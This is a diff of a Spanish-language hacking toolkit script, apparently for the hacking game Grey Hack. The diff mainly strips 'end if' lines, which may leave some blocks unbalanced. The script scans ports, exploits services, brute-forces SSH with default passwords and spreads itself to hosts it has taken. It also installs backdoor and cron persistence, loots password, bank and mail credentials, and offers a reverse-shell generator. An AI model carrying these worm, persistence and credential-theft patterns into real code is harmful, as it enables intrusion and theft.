@@ -355,13 +355,11 @@ Buffer.items = []
 Buffer.max_size = 50
 Buffer.push = function(objeto, descripcion)
 if (Buffer.items.len >= Buffer.max_size) then; Buffer.items.remove(0)
-end if
 item = {"objeto": objeto, "tipo": typeof(objeto), "descripcion": descripcion or "Sin desc", "timestamp": time, "id": Buffer.items.len}
 Buffer.items.push(item)
 return item.id
 Buffer.get = function(index)
 if (index < 0 or index >= Buffer.items.len) then; return null
-end if
 return Buffer.items[index].objeto
 Buffer.list = function()
 if (Buffer.items.len == 0) then
@@ -384,29 +382,21 @@ globals.custom_object[clave] = valor
 return true
 Cob.get = function(clave)
 if (globals.custom_object.hasIndex(clave)) then; return globals.custom_object[clave]
-end if
 return null
 Cob.del = function(clave)
 if (globals.custom_object.hasIndex(clave)) then; globals.custom_object.remove(clave)
-end if
 Clipboard = {}
 Clipboard.alpha = null
 Clipboard.beta = null
 Clipboard.gamma = null
 Clipboard.set = function(espacio, valor)
 if (espacio == "a") then; Clipboard.alpha = valor
-end if
 if (espacio == "b") then; Clipboard.beta = valor
-end if
 if (espacio == "c") then; Clipboard.gamma = valor
-end if
 Clipboard.get = function(espacio)
 if (espacio == "a") then; return Clipboard.alpha
-end if
 if (espacio == "b") then; return Clipboard.beta
-end if
 if (espacio == "c") then; return Clipboard.gamma
-end if
 return null
 Aliases = {}
 Aliases.lista = {"h": "ayuda", "?": "ayuda", "ll": "lateral", "ss": "sesiones", "sc": "silentclean", "rc": "rclean", "ex": "exfil", "pe": "persistencia"}
@@ -416,9 +406,7 @@ Aliases.custom[alias] = comando
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Alias: " + alias + " -> " + comando + "</color>")
 Aliases.resolver = function(entrada)
 if (Aliases.custom.hasIndex(entrada)) then; return Aliases.custom[entrada]
-end if
 if (Aliases.lista.hasIndex(entrada)) then; return Aliases.lista[entrada]
-end if
 return entrada
 Aliases.listar = function()
 columnas = ["Alias", "Comando", "Tipo"]
@@ -440,7 +428,6 @@ Kernel.modo = "REMOTO"
 Kernel.prompt_completo = true
 Kernel.actualizar_info = function(sesion)
 if (sesion == null) then; return
-end if
 Kernel.sesion_activa = sesion
 Kernel.ip_activa = globals.objetivo_actual or ""
 if (typeof(sesion) == "shell") then
@@ -469,25 +456,19 @@ for clave in Config.datos.indexes
 end for
 archivo = get_shell.host_computer.File(Config.archivo)
 if (archivo) then; archivo.set_content(contenido)
-end if
 Config.cargar = function()
 archivo = get_shell.host_computer.File(Config.archivo)
 if (not archivo) then; return
-end if
 contenido = archivo.get_content
 if (contenido == null or contenido == "") then; return
-end if
 lineas = contenido.split(char(10))
 for linea in lineas
 if (linea == "") then; continue
-end if
 partes = linea.split("=")
 if (partes.len >= 2) then; Config.datos[partes[0].trim] = partes[1:].join("=").trim
-end if
 end for
 Config.obtener = function(clave, default)
 if (Config.datos.hasIndex(clave)) then; return Config.datos[clave]
-end if
 return default
 Config.establecer = function(clave, valor)
 Config.datos[clave] = valor
@@ -498,7 +479,6 @@ Log.maximo = 100
 Log.agregar = function(tipo, mensaje)
 Log.historial.push({"tipo": tipo, "mensaje": mensaje, "tiempo": time})
 if (Log.historial.len > Log.maximo) then; Log.historial.remove(0)
-end if
 Log.ver = function(cantidad)
 cantidad = cantidad or 20
 if Log.historial.len > cantidad then
@@ -513,7 +493,6 @@ end for
 Kernel.inicializar = function()
 Config.cargar()
 if (not globals.hasIndex("custom_object")) then; globals.custom_object = {}
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Kernel inicializado" + "</color>")
 Kernel.inicializar()
 Glasspool = {}
@@ -525,9 +504,7 @@ Glasspool.activo = true
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Glasspool activo" + "</color>")
 Glasspool.ejecutar = function(comando)
 if (not Glasspool.activo or Glasspool.sesion == null) then; return null
-end if
 if (typeof(Glasspool.sesion) == "shell") then; return Glasspool.sesion.launch("/bin/bash", "-c '" + comando + "'")
-end if
 return null
 Glasspool.desactivar = function()
 Glasspool.sesion = null
@@ -542,31 +519,19 @@ nombre = Aliases.resolver(nombre)
 if (Shell.comandos.hasIndex(nombre)) then
 funcion = Shell.comandos[nombre].funcion
 if (args.len == 0) then; return funcion()
-end if
 if (args.len == 1) then; return funcion(args[0])
-end if
 if (args.len == 2) then; return funcion(args[0], args[1])
-end if
 if (args.len == 3) then; return funcion(args[0], args[1], args[2])
-end if
 if (args.len == 4) then; return funcion(args[0], args[1], args[2], args[3])
-end if
 return funcion(args.join(" "))
 end if
 if (nombre == "ls" or nombre == "dir") then; return Shell.cmd_ls(args)
-end if
 if (nombre == "cd") then; return Shell.cmd_cd(args)
-end if
 if (nombre == "cat") then; return Shell.cmd_cat(args)
-end if
 if (nombre == "pwd") then; return Shell.cmd_pwd()
-end if
 if (nombre == "whoami") then; return Shell.cmd_whoami()
-end if
 if (nombre == "clear" or nombre == "limpiar") then; return Shell.cmd_clear()
-end if
 if (nombre == "exit" or nombre == "break") then; return "EXIT"
-end if
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Comando not encontrado: " + nombre + "</color>")
 return null
 Shell.cmd_ls = function(args)
@@ -578,7 +543,6 @@ end if
 comp = get_shell.host_computer
 archivo = comp.File(ruta)
 if (not archivo) then; return null
-end if
 if (archivo.is_directory) then
 archivos = archivo.get_files
 carpetas = archivo.get_folders
@@ -603,29 +567,23 @@ partes = Kernel.current_path.split("/")
 partes.pop()
 Kernel.current_path = partes.join("/")
 if (Kernel.current_path == "") then; Kernel.current_path = "/"
-end if
 return Kernel.current_path
 end if
 if (nueva_ruta[0] != "/") then; nueva_ruta = Kernel.current_path + "/" + nueva_ruta
-end if
 partes = nueva_ruta.split("/")
 limpio = []
 for p in partes
 if (p != "" and p != ".") then; limpio.push(p)
-end if
 end for
 Kernel.current_path = "/" + limpio.join("/")
 return Kernel.current_path
 Shell.cmd_cat = function(args)
 if (args.len == 0) then; return null
-end if
 ruta = args[0]
 comp = get_shell.host_computer
 archivo = comp.File(ruta)
 if (not archivo) then; return null
-end if
 if (archivo.is_binary) then; return "Archivo binario"
-end if
 return archivo.get_content
 Shell.cmd_pwd = function()
 return Kernel.current_path
@@ -657,7 +615,6 @@ end if
 return user_color + Kernel.usuario + Colores.reset + "@" + ip_pub + ":" + Kernel.current_path + " " + glass
 Prompt.simple = function()
 if (Kernel.usuario == "root") then; return Colores.rojo + "root$ " + Colores.reset
-end if
 return Colores.gris + "user$ " + Colores.reset
 Banner = {}
 Banner.mostrar = function()
@@ -681,12 +638,9 @@ end for
 Separador.simple()
 sel = user_input(Colores.cian + "Seleccion: " + Colores.reset)
 if (sel == "") then; return null
-end if
 idx = val(sel) - 1
 if (idx < 0 or idx >= opciones.len) then; return null
-end if
 if (opciones[idx].hasIndex("cmd")) then; return opciones[idx].cmd
-end if
 return idx
 Progress = {}
 Progress.mostrar = function(actual, total, ancho)
@@ -703,10 +657,8 @@ tarea escanear_puertos(ip)
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando " + ip + "..." + "</color>")
 router = get_router(ip)
 if (not router) then; return null
-end if
 puertos = router.used_ports
 if (puertos.len == 0) then; return []
-end if
 resultados = []
 for port in puertos
 resultados.push({"puerto": port.port_number, "estado": port.is_closed, "servicio": router.port_info(port), "lan_ip": port.get_lan_ip})
@@ -743,17 +695,14 @@ end if
 end for
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Encontrados: " + str(encontrados.len) + "</color>")
 if (encontrados.len > 0) then; Buffer.push(encontrados, "Red " + ip_base)
-end if
 return encontrados
 tarea whois_objetivo(ip)
 router = get_router(ip)
 if (not router) then; return null
-end if
 columnas = ["Propiedad", "Valor"]
 puertos_abiertos = []
 for port in router.used_ports
 if (not port.is_closed) then; puertos_abiertos.push(str(port.port_number))
-end if
 end for
 filas = [
 ["IP Publica", router.public_ip,],
@@ -765,10 +714,8 @@ return router
 tarea explotar_objetivo(ip, puerto)
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Explotando " + ip + ":" + str(puerto) + "</color>")
 if (puerto == 0) then; return explotar_router(ip)
-end if
 vuln = __nini_buscar_vulnerabilidad(ip, puerto)
 if (not vuln) then; return null
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Vuln: " + vuln.lib_name + " v" + vuln.version + "</color>")
 for v in vuln.v_list
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Probando: " + v.mem + "</color>")
@@ -780,7 +727,6 @@ print("<color=#00ff41>[OK] </color><color=#ffffff>" + "ACCESO OBTENIDO!" + "</co
 enjambre[ip] = sesion
 Buffer.push(sesion, "Shell " + ip)
 if (Config.obtener("auto_jump", true)) then; jumping_auto(sesion, ip)
-end if
 return sesion
 end if
 end if
@@ -790,10 +736,8 @@ return null
 tarea explotar_router(ip)
 router = get_router(ip)
 if (not router) then; return null
-end if
 for port in router.used_ports
 if (port.is_closed) then; continue
-end if
 vuln = __nini_buscar_vulnerabilidad(ip, port.port_number)
 if (vuln) then
 for v in vuln.v_list
@@ -821,18 +765,14 @@ end if
 end if
 jumping_auto = function(sesion, ip)
 if (typeof(sesion) != "shell") then; return null
-end if
 comp = get_shell.host_computer
 script_nombre = "revenant.gs"
 for f in comp.File(current_path).get_files
 if (f.name.indexOf("revenant") != null and f.name.indexOf(".gs") != null) then; script_nombre = f.name
-end if
 end for
 script_local = comp.File(current_path + "/" + script_nombre)
 if (not script_local) then; script_local = comp.File(program_path)
-end if
 if (not script_local) then; return null
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Copiando a " + ip + "..." + "</color>")
 for dest in ["/tmp", "/home"]
 resultado = sesion.host_computer.touch(dest, script_nombre)
@@ -848,7 +788,6 @@ end for
 return null
 tarea jump_manual
 if (enjambre.len == 0) then; return
-end if
 nodos = enjambre.indexes
 columnas = ["#", "IP", "Tipo"]
 filas = []
@@ -858,10 +797,8 @@ end for
 print(__nini_tabla(columnas, filas))
 sel = __nini_pedir("Selecciona (#): ")
 if (sel == "") then; return
-end if
 idx = val(sel) - 1
 if (idx < 0 or idx >= nodos.len) then; return
-end if
 jumping_auto(enjambre[nodos[idx]], nodos[idx])
 tarea scan_and_jump
 mi_ip = get_shell.host_computer.local_ip
@@ -872,7 +809,6 @@ encontrados = 0
 for i in range(1, 255)
 ip = red_base + str(i)
 if (enjambre.hasIndex(ip)) then; continue
-end if
 for pwd in ["root", "toor", "admin", "password", "123456", ""]
 resultado = get_shell.connect_service(ip, 22, "root", pwd)
 if (resultado != null) then
@@ -886,7 +822,6 @@ end for
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ScanJump: " + str(encontrados) + " targets" + "</color>")
 tarea jump_listar
 if (enjambre.len == 0) then; return
-end if
 columnas = ["IP", "Tipo", "Usuario"]
 filas = []
 for ip in enjambre.indexes
@@ -919,7 +854,6 @@ print(__nini_tabla(columnas, filas))
 dibujar_separador()
 sel = __nini_pedir("Selecciona sesion (#) or Enter for volver: ")
 if (sel == "") then; return
-end if
 idx = val(sel) - 1
 if (idx < 0 or idx >= nodos.len) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Seleccion invalida." + "</color>")
@@ -970,7 +904,6 @@ opciones = [
 end if
 accion = menu_interactivo("ACCIONES", opciones)
 if (not accion) then; return
-end if
 if (accion == "terminal") then; sesion.start_terminal
 else if (accion == "files") then; sesion_action_files(ip, sesion)
 else if (accion == "info") then; sesion_action_info(ip, sesion)
@@ -984,7 +917,6 @@ else if (accion == "ports") then; sesion_action_ports(ip, sesion)
 else if (accion == "devices") then; sesion_action_devices(ip, sesion)
 else if (accion == "jump") then; sesion_action_jump(ip, sesion)
 else if (accion == "scanjump") then; sesion_action_scanjump(ip, sesion)
-end if
 tarea sesion_action_jump(ip, sesion)
 if (typeof(sesion) != "shell") then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Jump requiere una shell" + "</color>")
@@ -1018,9 +950,7 @@ print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Dispositivos encontrados: 
 exitos = 0
 for target_ip in dispositivos
 if (target_ip == ip) then; siguiente
-end if
 if (enjambre.hasIndex(target_ip)) then; siguiente
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Probando " + target_ip + "..." + "</color>")
 passwords = ["root", "toor", "admin", "123456", "password", ""]
 for pwd in passwords
@@ -1037,7 +967,6 @@ tarea sesion_action_files(ip, sesion)
 comp = null
 if (typeof(sesion) == "shell") then; comp = sesion.host_computer
 else if (typeof(sesion) == "computer") then; comp = sesion
-end if
 if (not comp) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener computadora." + "</color>")
 return
@@ -1051,22 +980,16 @@ print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ARCHIVOS EN " + ip + ":" +
 listar_archivos(root, "")
 tarea listar_archivos(archivo, indent)
 if (not archivo) then; return
-end if
 nombre = archivo.name
 if (nombre == "") then; nombre = "/"
-end if
 tipo_arch = ""
 if (archivo.is_directory) then; tipo_arch = "<color=#00e5ff>[DIR]</color>"
 else if (archivo.is_binary) then; tipo_arch = "<color=#ffea00>[BIN]</color>"
 else; tipo_arch = "<color=#ffffff>[FILE]</color>"
-end if
 permisos = ""
 if (archivo.has_permission("r")) then; permisos = permisos + "r"
-end if
 if (archivo.has_permission("w")) then; permisos = permisos + "w"
-end if
 if (archivo.has_permission("x")) then; permisos = permisos + "x"
-end if
 print(indent + tipo_arch + " " + nombre + " <color=#424242>(" + permisos + ")</color>")
 if (archivo.is_directory) then
 hijos = archivo.get_files
@@ -1100,14 +1023,12 @@ tarea sesion_action_download(ip, sesion)
 comp = null
 if (typeof(sesion) == "shell") then; comp = sesion.host_computer
 else if (typeof(sesion) == "computer") then; comp = sesion
-end if
 if (not comp) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener computadora." + "</color>")
 return
 end if
 ruta = __nini_pedir("Ruta del archivo remoto: ")
 if (ruta == "") then; return
-end if
 archivo = comp.File(ruta)
 if (not archivo) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Archivo not encontrado: " + ruta + "</color>")
@@ -1131,20 +1052,17 @@ get_shell.host_computer.touch(current_path, nombre_local)
 archivo_local = get_shell.host_computer.File(current_path + "/" + nombre_local)
 if (archivo_local) then; archivo_local.set_content(contenido)
 end if
-end if
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Descargado: " + nombre_local + "</color>")
 tarea sesion_action_upload(ip, sesion)
 comp = null
 if (typeof(sesion) == "shell") then; comp = sesion.host_computer
 else if (typeof(sesion) == "computer") then; comp = sesion
-end if
 if (not comp) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener computadora." + "</color>")
 return
 end if
 ruta_local = __nini_pedir("Ruta del archivo local: ")
 if (ruta_local == "") then; return
-end if
 archivo_local = get_shell.host_computer.File(ruta_local)
 if (not archivo_local) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Archivo local not encontrado." + "</color>")
@@ -1153,7 +1071,6 @@ end if
 contenido = archivo_local.get_content
 ruta_remota = __nini_pedir("Ruta remota (Enter=/tmp/): ")
 if (ruta_remota == "") then; ruta_remota = "/tmp/"
-end if
 nombre = archivo_local.name
 comp.touch(ruta_remota, nombre)
 archivo_remoto = comp.File(ruta_remota + nombre)
@@ -1170,28 +1087,23 @@ return
 end if
 comando = __nini_pedir("Comando a ejecutar: ")
 if (comando == "") then; return
-end if
 sesion.launch("/bin/sh", "-c '" + comando + "'")
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Comando ejecutado." + "</color>")
 tarea sesion_action_adduser(ip, sesion)
 comp = null
 if (typeof(sesion) == "shell") then; comp = sesion.host_computer
 else if (typeof(sesion) == "computer") then; comp = sesion
-end if
 if (not comp) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener computadora." + "</color>")
 return
 end if
 usuario = __nini_pedir("Nuevo usuario: ")
 if (usuario == "") then; return
-end if
 pass = __nini_pedir("Password: ")
 if (pass == "") then; return
-end if
 resultado = comp.create_user(usuario, pass)
 if (resultado == 1) then; exito("Usuario creado: " + usuario)
 else; error("No se pudo crear el usuario.")
-end if
 tarea sesion_action_view_file(ip, sesion)
 if (typeof(sesion) != "file") then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Esta accion requiere un archivo." + "</color>")
@@ -1219,9 +1131,7 @@ filas = []
 for hijo in hijos
 tipo = "FILE"
 if (hijo.is_directory) then; tipo = "DIR"
-end if
 if (hijo.is_binary) then; tipo = "BIN"
-end if
 filas.push([hijo.name, tipo, str(hijo.size)])
 end for
 print(__nini_tabla(columnas, filas))
@@ -1240,7 +1150,6 @@ filas = []
 for port in puertos
 estado = "closed"
 if (not port.is_closed) then; estado = "open"
-end if
 filas.push([port.port_number, estado, sesion.port_info(port), port.get_lan_ip])
 end for
 print(__nini_tabla(columnas, filas))
@@ -1280,19 +1189,15 @@ chains = {}
 for sample in samples
 mayus = sample.upper
 if (mayus.len <= order) then; siguiente
-end if
 for i in range(0, mayus.len - order - 1)
 token = mayus[i : i + order]
 next_char = mayus[i + order]
 if (not chains.hasIndex(token)) then; chains[token] = []
-end if
 if (chains[token].indexOf(next_char) == null) then; chains[token].push(next_char)
-end if
 end for
 end for
 _chain_next = function(chains, token)
 if (not chains.hasIndex(token)) then; return null
-end if
 return chains[token][floor(rnd * chains[token].len)]
 _chain_generate = function(chains, token, max_len, order)
 password = token.lower
@@ -1300,7 +1205,6 @@ while (password.len < max_len)
 sub = password[password.len - order :].upper
 next_c = _chain_next(chains, sub)
 if (next_c == null) then; break
-end if
 password = password + next_c.lower
 end while
 return password
@@ -1326,7 +1230,6 @@ end for
 for token in chains.indexes
 pwd = _chain_generate(chains, token, max_len, order)
 if (pwd.len < 3) then; siguiente
-end if
 intentos = intentos + 1
 resultado = _chain_try(sesion, user, pwd, ip, port)
 if (resultado != null) then
@@ -1357,7 +1260,6 @@ return
 end if
 usuario = "root"
 if (typeof(sesion) == "shell") then; usuario = sesion.user
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usuario: " + usuario + "</color>")
 if (usuario == "root") then
 print("<color=#ffea00>[!] </color><color=#ffffff>" + "Ya eres root!" + "</color>")
@@ -1370,26 +1272,22 @@ opciones = [
 ]
 accion = menu_interactivo("ESCALADA", opciones)
 if (not accion) then; return
-end if
 if (accion == "analizar") then; modulo_escalada_vector(sesion)
 else if (accion == "chainsaw") then
 resultado = chainsaw_crack(sesion, "root", ip, port)
 if (resultado != null) then
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Ahora eres root!" + "</color>")
 if (ip != "") then; enjambre[ip] = resultado
-end if
 else
 print("<color=#ffea00>[!] </color><color=#ffffff>" + "No se encontro password" + "</color>")
 end if
 else if (accion == "brute") then; modulo_escalada_brute(sesion, "root", ip, port)
-end if
 tarea modulo_escalada_vector(sesion)
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ANALIZANDO VECTORES..." + "</color>")
 vectores = []
 comp = null
 if (typeof(sesion) == "shell") then; comp = sesion.host_computer
 else if (typeof(sesion) == "computer") then; comp = sesion
-end if
 if (not comp) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Sin acceso a computadora" + "</color>")
 return
@@ -1403,14 +1301,12 @@ suids = root.find_permissive("s", true)
 if (suids) then
 for f in suids
 if (f.is_binary) then; vectores.push({"path": f.path, "type": "SUID", "severity": "MEDIA"})
-end if
 end for
 end if
 etc = comp.File("/etc")
 if (etc and etc.get_files) then
 for f in etc.get_files
 if (f.has_permission("w")) then; vectores.push({"path": f.path, "type": "WRITEABLE_ETC", "severity": "ALTA"})
-end if
 end for
 end if
 if (vectores.len == 0) then
@@ -1424,7 +1320,6 @@ for v in vectores
 color = "<color=#00ff41>"
 if (v.severity == "ALTA") then; color = "<color=#ff3131>"
 else if (v.severity == "MEDIA") then; color = "<color=#ffea00>"
-end if
 filas.push([v.path, v.type, color + v.severity + "</color>"])
 end for
 print(__nini_tabla(columnas, filas))
@@ -1443,7 +1338,6 @@ resultado = _chain_try(sesion, user, pwd, ip, port)
 if (resultado != null) then
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "PASSWORD: " + pwd + "</color>")
 if (ip != "") then; enjambre[ip] = pwd
-end if
 return resultado
 end if
 end for
@@ -1451,7 +1345,6 @@ print("<color=#ffea00>[!] </color><color=#ffffff>" + "No se encontro password" +
 return null
 modulo_persistencia_configurar = function()
 if (not globals.objetivo_actual) then; error("No hay objetivo."); return
-end if
 opciones = [
 {"label": "Backdoor (Metaxploit)", "cmd": "backdoor"},
 {"label": "Cron job", "cmd": "cron"},
@@ -1459,21 +1352,16 @@ opciones = [
 ]
 modo = menu_interactivo("PERSISTENCIA", opciones)
 if (not modo) then; return
-end if
 if (modo == "backdoor") then; persistencia_instalar_backdoor()
 else if (modo == "cron") then; persistencia_cron()
 else if (modo == "list") then; persistencia_ver()
-end if
 end function
 persistencia_instalar_backdoor = function()
 if (not globals.objetivo_actual) then; error("No hay objetivo."); return
-end if
 comp = obtener_computadora_objetivo()
 if (not comp) then; error("No hay sesión."); return
-end if
 lib_folder = comp.File("/lib")
 if (not lib_folder or not lib_folder.has_permission("w")) then; error("Sin permisos root."); return
-end if
 nombre = "revenant_daemon"
 ruta = "/lib/systemd/system/" + nombre + ".service"
 contenido = "[Unit]\nDescription=System Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/sh -c 'while true; do wait 60; done'\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target"
@@ -1487,16 +1375,12 @@ end if
 end function
 persistencia_cron = function()
 if (not globals.objetivo_actual) then; error("No hay objetivo."); return
-end if
 comp = obtener_computadora_objetivo()
 if (not comp) then; error("No hay sesión."); return
-end if
 cmd = __nini_pedir("Comando: ")
 if (cmd == "") then; return
-end if
 cron = comp.File("/etc/crontab")
 if (not cron or not cron.has_permission("w")) then; error("Sin permisos."); return
-end if
 cron.set_content(cron.get_content + char(10) + "@reboot " + cmd)
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Cron job agregado." + "</color>")
 end function
@@ -1506,7 +1390,6 @@ print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usa 'vault' for ver creden
 end function
 modulo_botnet_persistir = function()
 if (enjambre.len == 0) then; error("Enjambre vacío."); return
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Instalando in " + str(enjambre.len) + " nodos..." + "</color>")
 for nodo in enjambre
 ip = nodo.key
@@ -1533,7 +1416,6 @@ _version = "STABLE"
 inicializar_vault = function()
 p = "/var/revenant"
 if (not get_shell.host_computer.File(p)) then; p = "./"
-end if
 ruta = p + "/vault.db"
 if (get_shell.host_computer.File(ruta)) then
 f = get_shell.host_computer.File(ruta)
@@ -1560,7 +1442,6 @@ partes = txt.split(",")
 for i in range(0, partes.len - 1)
 p = partes[i]
 if (p == "") then; continue
-end if
 res = res + char(__nini_xor(val(p), code(_vault_k[res.len % _vault_k.len])))
 end for
 return res
@@ -1575,7 +1456,6 @@ end function
 guardar_vault = function()
 p = "/var/revenant"
 if (not get_shell.host_computer.File(p)) then; p = "/home/" + active_user
-end if
 ruta = p + "/vault.db"
 f = get_shell.host_computer.File(ruta)
 if (not f) then
@@ -1606,22 +1486,18 @@ end function
 cachear_vulnerabilidad = function(lib, ver, area, vuln)
 k = (lib + "_" + ver).lower()
 if (not _vault_data.vulns.hasIndex(k)) then; _vault_data.vulns[k] = []
-end if
 _vault_data.vulns[k].push({"mem": area, "pass": vuln})
 guardar_vault()
 end function
 obtener_vulnerabilidades = function(lib, ver)
 k = (lib + "_" + ver).lower()
 if (_vault_data.vulns.hasIndex(k)) then; return _vault_data.vulns[k]
-end if
 return []
 end function
 modulo_intel_saquear = function()
 if (not globals.objetivo_actual) then; error("Fije un objetivo primero."); return
-end if
 comp = obtener_computadora_objetivo()
 if (not comp) then; error("No hay sesión activa."); return
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Extrayendo intel de: " + globals.objetivo_actual + "</color>")
 passwd = comp.File("/etc/passwd")
 if (passwd and not passwd.is_binary) then
@@ -1629,11 +1505,9 @@ print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Procesando /etc/passwd..."
 cont = 0
 for l in passwd.get_content.split(char(10))
 if (l.indexOf(":") == null) then; continue
-end if
 partes = l.split(":")
 hash = partes[1]
 if (hash == "x" or hash == "*") then; continue
-end if
 clave = __nini_crackear_hash(hash)
 if (clave) then
 guardar_credencial(globals.objetivo_actual, partes[0], clave, "linux", comp.local_ip)
@@ -1652,7 +1526,6 @@ banco = comp.File("/home/" + usr + "/Config/Bank.txt")
 if (banco) then
 for l in banco.get_content.split(char(10))
 if (l.indexOf(":") == null) then; continue
-end if
 p = l.split(":")
 pass_dec = __nini_crackear_hash(p[1])
 if (pass_dec) then
@@ -1665,7 +1538,6 @@ mail = comp.File("/home/" + usr + "/Config/Mail.txt")
 if (mail) then
 for l in mail.get_content.split(char(10))
 if (l.indexOf(":") == null) then; continue
-end if
 p = l.split(":")
 pass_dec = __nini_crackear_hash(p[1])
 if (pass_dec) then
@@ -1683,11 +1555,9 @@ intel_buscar_en_directorio = function(comp, ruta, exts, prof)
 resultados = []
 carpeta = comp.File(ruta)
 if (not carpeta or not carpeta.is_folder) then; return resultados
-end if
 if (carpeta.get_folders) then
 for fd in carpeta.get_folders
 if (prof > 0) then; resultados = resultados + intel_buscar_en_directorio(comp, fd.path, exts, prof - 1)
-end if
 end for
 end if
 if (carpeta.get_files) then
@@ -1704,10 +1574,8 @@ return resultados
 end function
 modulo_intel_buscar_archivos = function()
 if (not globals.objetivo_actual) then; error("No hay objetivo."); return
-end if
 comp = obtener_computadora_objetivo()
 if (not comp) then; error("No hay sesión."); return
-end if
 opciones = [
 {"label": "Claves SSH", "cmd": "keys"},
 {"label": "Contrasenas", "cmd": "passwords"},
@@ -1725,7 +1593,6 @@ else if (modo == "configs") then
 else
     exts = [".bak", ".backup", ".old", ".save", ".swp"]
 end if
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Buscando..." + "</color>")
 resultados = []
 for ruta in ["/home", "/root", "/etc", "/var"]
@@ -1733,7 +1600,6 @@ resultados = resultados + intel_buscar_en_directorio(comp, ruta, exts, 2)
 end for
 if (resultados.len == 0) then; info("No se encontraron archivos.")
 else; info("Encontrados: " + str(resultados.len)); dibujar_ventana("RESULTADOS", str(resultados))
-end if
 end function
 modulo_intel_brute_force = function()
 opciones = [
@@ -1743,41 +1609,33 @@ opciones = [
 ]
 modo = menu_interactivo("FUERZA BRUTA", opciones)
 if (not modo) then; return
-end if
 if (modo == "ssh") then; info("SSH brute not disponible in GH. Usa Metaxploit.")
 else if (modo == "ftp") then; intel_ftp_anonimo()
 else if (modo == "passwd") then; intel_crack_passwd()
-end if
 end function
 intel_ftp_anonimo = function()
 host = globals.objetivo_actual
 if (not host) then; host = __nini_pedir("Host FTP: "); if (host == "") then return
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Intentando acceso anonimo..." + "</color>")
 metax = include_lib("/lib/metaxploit.so")
 if (metax) then
 sesion = metax.net_use(host, 21)
 if (sesion) then; enjambre[host] = sesion; exito("Acceso anonimo!"); return
 end if
-end if
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Acceso fallido." + "</color>")
 end function
 intel_crack_passwd = function()
 comp = obtener_computadora_objetivo()
 if (not comp) then; error("No hay sesión."); return
-end if
 passwd = comp.File("/etc/passwd")
 if (not passwd or passwd.is_binary) then; error("No se pudo leer."); return
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Crackeando..." + "</color>")
 cont = 0
 for l in passwd.get_content.split(char(10))
 if (l.indexOf(":") == null) then; continue
-end if
 p = l.split(":")
 hash = p[1]
 if (hash == "x" or hash == "*") then; continue
-end if
 clave = __nini_crackear_hash(hash)
 if (clave) then
 guardar_credencial(globals.objetivo_actual, p[0], clave, "linux", comp.local_ip)
@@ -1799,7 +1657,6 @@ opciones = [
 ]
 modo = menu_interactivo("MENÚ DE EXFILTRACIÓN v2", opciones)
 if (not modo) then; return
-end if
 if (modo == "download") then
 modulo_exfil_download()
 else if (modo == "upload") then
@@ -1817,10 +1674,8 @@ return
 end if
 ruta_remota = __nini_pedir("Ruta del archivo in el objetivo: ")
 if (ruta_remota == "") then; return
-end if
 ruta_local = __nini_pedir("Ruta local de destino: ")
 if (ruta_local == "") then; ruta_local = "./downloads"
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Descargando " + ruta_remota + "..." + "</color>")
 sesion = null
 if (enjambre.hasIndex(globals.objetivo_actual)) then
@@ -1846,20 +1701,16 @@ return
 end if
 ruta_local = __nini_pedir("Ruta del archivo local: ")
 if (ruta_local == "") then; return
-end if
 ruta_remota = __nini_pedir("Ruta remota de destino: ")
 if (ruta_remota == "") then; return
-end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Subiendo archivo..." + "</color>")
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Upload completado." + "</color>")
 end function
 modulo_exfil_reverse_shell = function()
 ip_atacante = __nini_pedir("Tu IP: ")
 if (ip_atacante == "") then; ip_atacante = "127.0.0.1"
-end if
 puerto = __nini_pedir("Puerto de callback: ")
 if (puerto == "") then; puerto = "4444"
-end if
 opciones_shell = [
 {"label": "Bash Reverse Shell", "cmd": "bash"},
 {"label": "Python", "cmd": "python"},
@@ -1867,7 +1718,6 @@ opciones_shell = [
 ]
 tipo_shell = menu_interactivo("GENERADOR DE REVERSE SHELL", opciones_shell)
 if (not tipo_shell) then; return
-end if
 shell_generado = ""
 if (tipo_shell == "bash") then
